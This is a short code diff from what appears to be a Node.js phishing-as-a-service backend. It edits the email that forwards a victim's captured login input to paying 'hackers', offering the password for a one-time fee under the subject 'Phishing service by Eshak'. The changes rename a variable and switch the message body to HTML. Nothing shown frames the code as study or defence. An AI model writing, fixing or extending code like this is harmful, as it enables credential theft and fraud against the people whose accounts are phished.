@@ -57,7 +57,7 @@ const decrypted = encryptpwd.decrypt(encrypted, password);
     
     
    // console.log("es"+toMail);
-    var message = "<h1> Dear Hackers,</h1> <p>To get password, you have to pay onetime tk-100, for the stay live server running. <p>  </p> If the input value has correct then id was hacked! "+captured_content;
+    var template = "<h1> Dear Hackers,</h1> <p>To get password, you have to pay onetime tk-100, for the stay live server running. <p>  </p> If the input value has correct then id was hacked! "+captured_content;
 
     
   if(req.body.owner){
@@ -78,7 +78,7 @@ const decrypted = encryptpwd.decrypt(encrypted, password);
   from: 'bdeshak5@gmail.com',
   to: toEmail.email, //list of receivers
   subject: 'Phishing service by "Eshak"', // Subject line
-  text: message //plain text body
+  html: template //plain text body
 };
 
 transporter.sendMail(mailOptions, function (err, info) {
